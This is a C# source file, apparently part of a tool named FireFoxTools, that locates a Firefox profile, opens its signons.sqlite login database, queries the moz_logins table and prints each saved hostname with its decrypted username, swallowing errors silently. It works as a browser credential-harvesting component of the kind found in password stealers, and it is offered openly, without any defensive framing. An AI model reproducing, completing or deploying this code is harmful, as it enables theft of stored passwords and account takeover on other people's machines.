using System;
using System.Data;
using System.Data.SQLite;
using System.IO;

namespace FireFoxTools
{
    public class GetSignons
    {
        public static void Password()
        {
            foreach (var SingleFile in Directory.GetFiles(FireFoxPath.GetRandomFF(), "signons.sqlite"))
            {
                if (!File.Exists(SingleFile))
                {
                    break;
                }
                else
                {
                    using (var Connect = new SQLiteConnection($"Data Source={SingleFile};Version=3;FailIfMissing=True;"))
                    {
                        Console.WriteLine("");
                        using (var ComText = new SQLiteCommand("SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins", Connect))
                        {
                            Connect.Open();
                            Console.WriteLine("Подключились");
                            ComText.CommandType = CommandType.Text;
                            try
                            {
                                using (var reader = ComText.ExecuteReader())
                                {
                                    if (reader.HasRows)
                                    {
                                        Console.WriteLine("Есть записи");
                                        while (reader.Read())
                                        {
                                            Console.WriteLine("Перебираем");
                                            Console.WriteLine();
                                            Console.WriteLine(reader.GetString(2));
                                            Console.WriteLine(DecryptTools.Decrypt(reader.GetString(0)));
                                           // Console.WriteLine(reader.GetString(1));
                                        }
                                    }
                                    else
                                    {
                                        Console.WriteLine("Записей нет");
                                    }
                                }
                            }
                            catch { }
                        }
                    }
                }
            }
        }
    }
}